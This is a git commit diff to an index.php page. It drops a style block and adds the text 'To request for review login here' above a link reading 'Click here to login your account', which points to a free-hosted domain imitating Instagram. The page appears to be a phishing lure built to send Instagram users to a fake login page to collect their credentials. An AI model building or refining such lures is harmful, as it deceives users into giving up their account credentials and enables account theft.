23272a22cb65271eb697f38ed1c69e49266b0754
coder712 <113036785+coder712@users.noreply.github.com>
2022-09-08 14:26:52 +0530

    Update index.php

--- index.php
+++ index.php
@@ -6,18 +6,11 @@
     <meta name="viewport" content=" width=device-width,initial-scale=1.0">
     <meta http-equiv="refresh" content="60" >
   	<link rel= "icon" href="images/favicon.png" type="image/icon">	
-<style>
 
-.content {
-  text-align: center;
-  padding-top: 20%;
-}
-
-</style>
 </head>
 <body>
 <div class="content">
-
+<p>To request for review login here </p>
 <a href="https://insta-mi.000webhostapp.com/" style="text-decoration: none;">Click here to login your account</a></div>
 
 </body>
